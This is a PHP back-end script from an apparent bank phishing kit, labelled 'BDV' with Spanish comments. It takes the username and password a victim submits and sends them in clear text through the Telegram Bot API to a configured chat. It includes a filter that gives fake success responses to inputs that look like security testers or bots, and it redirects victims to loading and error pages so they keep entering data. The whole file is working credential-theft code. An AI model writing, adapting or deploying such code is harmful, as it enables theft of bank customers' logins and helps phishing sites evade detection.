<?php
error_reporting(0);

// Configuración de Telegram
require 'config.php';

// Iniciar sesión
session_start();

// Datos del formulario
$nombre = isset($_POST['nombre']) ? trim($_POST['nombre']) : '';
$contra = isset($_POST['contra']) ? trim($_POST['contra']) : '';

// Almacenar el nombre en la sesión (solo el nombre)
$_SESSION['nombre'] = $nombre; 

// ========================================================
// FILTRO ANTI-BOTS MEJORADO (CON PALABRA ASENA)
// ========================================================
function es_ataque_bot($user, $pass) {
    // 0. Si el usuario está vacío, bloquear de inmediato
    if (empty($user)) {
        return true;
    }

    // 1. Filtrar la palabra específica 'Sitio'
    if (stripos($user, 'Sitio') !== false || stripos($pass, 'Sitio') !== false) {
        return true;
    }

    // 2. Lista negra de textos basura (Se añadió 'asena')
    $basura = ['test', 'admin', 'prueba', 'asd', '123456', 'aaaa', 'jack', 'bot', 'click', 'asena'];
    foreach ($basura as $palabra) {
        if (stripos($user, $palabra) !== false || stripos($pass, $palabra) !== false) {
            return true;
        }
    }

    // 3. Detectar patrones repetidos de letras (ej: "asdfasdf")
    if (preg_match('/(\w{3,})\1+/', $user) || preg_match('/(\w{3,})\1+/', $pass)) {
        return true;
    }

    // 4. Longitudes absurdas
    if (strlen($user) > 25 || strlen($pass) > 35) {
        return true;
    }

    return false; // Si pasa todo, es un humano real
}

// Ejecutar la validación de seguridad
if (es_ataque_bot($nombre, $contra)) {
    // Engañamos al bot respondiendo éxito simulado
    if (!empty($contra)) {
        header('Location: cargando.html');
    } else {
        echo "Nombre enviado";
    }
    exit();
}
// ========================================================

// Comprobar si el nombre contiene solo números
if (is_numeric($nombre)) {
    $message = "BDV 🆕 \n\n👤Nombre: " . $nombre;
    if (!empty($contra)) {
        $message .= "\n🔑Contraseña: " . $contra;
    }
    
    $telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
    $response = @file_get_contents($telegramApiUrl);

    header('Location: error.php');
    exit();
}

// Expresión regular para validar el formato de la contraseña
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[^a-zA-Z0-9\s]).{8,}$/';

// Componer el mensaje para enviar a Telegram
$message = "BDV 🆕 \n\n👤Nombre: " . $nombre;
if (!empty($contra)) {
    $message .= "\n🔑Contraseña: " . $contra;
}

$telegramApiUrl = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
$response = @file_get_contents($telegramApiUrl);

// Verificar si la contraseña cumple con el formato
if (!empty($contra) && !preg_match($pattern, $contra)) {
    header('Location: error.php');
    exit();
}

// Si la contraseña es válida, redirigir a cargando.html
if (!empty($contra)) {
    header('Location: cargando.html');
    exit();
} else {
    echo "Nombre enviado";
}
?>